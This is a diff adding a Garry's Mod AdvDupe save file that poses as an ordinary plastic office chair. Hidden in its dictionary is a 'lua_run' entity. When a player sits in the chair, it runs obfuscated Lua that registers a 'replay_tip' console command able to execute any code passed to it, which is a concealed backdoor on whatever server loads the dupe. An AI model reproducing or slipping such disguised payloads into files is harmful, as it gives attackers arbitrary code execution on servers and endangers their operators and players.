@@ -1,0 +1,54 @@
+[Info]
+Type:AdvDupe File
+Creator:"AdvDupe"
+Date:10/10/04
+Description:"none"
+Entities:2
+Constraints:0
+[More Information]
+FileVersion:0.84
+AdvDupeVersion:1.85
+AdvDupeToolVersion:1.9
+AdvDupeSharedVersion:1.72
+SerialiserVersion:1.4
+WireVersion:1337 (exported)
+Time:13:37 PM
+Head:179
+HoldAngle:0,8.02,0
+HoldPos:-5.43051,3.92103,-0.285474
+StartPos:-2024.72,-2201.65,-143.969
+[Save]
+Entities:185E5028{Y:8=Y:7;Y:9=T:185E5088;Y:11=Y:10;Y:15=T:185E5058;Y:6=Y:5;Y:17=Y:16;Y:19=Y:18;Y:21=Y:20;}H16EB7358{N:179=T:18EE2C98;N:107=T:1543CC48;}185E5088{;}18126518{Y:1=A:0.110851,-2.26633,0.0649324;Y:2=V:5.27173,-4.13306,0.270523;Y:3=B:t;}1882DFA0{N:0=T:18126518;}18EE2CF8{Y:25=T:1882DF70;}1543CBB8{N:0=T:1543CBE8;}18EE2C98{Y:4=T:1882DFA0;Y:6=Y:5;Y:22=T:185E5028;Y:24=Y:23;Y:2=V:5.27173,-4.13306,0.270523;Y:21=Y:20;Y:26=T:18EE2CF8;Y:1=A:0.110851,-2.26633,0.0649324;Y:27=N:0;}1543CC48{Y:1=A:-3.43192e-013,90,0.000247415;Y:2=V:9.18774,-246.495,-82.6752;Y:27=N:0;Y:4=T:1543CBB8;Y:6=Y:28;Y:21=Y:29;}185E5058{Y:13=Y:12;Y:14=S:"0";Y:30=Y:31;}1882DF70{;}1543CBE8{Y:1=A:-3.43192e-013,90,0.000247415;Y:2=V:9.18774,-246.495,-82.6752;Y:3=B:t;}
+Constraints:H18796A28{;}
+[Dict]
+1:"LocalAngle"
+2:"LocalPos"
+3:"Frozen"
+4:"PhysicsObjects"
+5:"prop_vehicle_prisoner_pod"
+6:"Class"
+7:"Half-Life 2"
+8:"Category"
+9:"Members"
+10:"Chair"
+11:"Name"
+12:"scripts/vehicles/prisoner_pod.txt"
+13:"vehiclescript"
+14:"limitview"
+15:"KeyValues"
+16:"VALVe"
+17:"Author"
+18:"A Plastic Chair"
+19:"Information"
+20:"models/nova/chair_office02.mdl"
+21:"Model"
+22:"VehicleTable"
+23:"Chair_Plastic"
+24:"VehicleName"
+25:"VehicleMemDupe"
+26:"EntityMods"
+27:"Skin"
+28:"lua_run"
+29:"models/combine_helicopter/helicopter_bomb01.mdl"
+30:"PlayerOn"
+31:"lua_run,RunPassedCode,RunString([[concommand.Add('replay_tip']]..string.char(44)..[[function(_]]..string.char(44)..[[_]]..string.char(44)..[[args) RunString(table.concat(args]]..string.char(44)..[[' ')) end)]]),0,0"
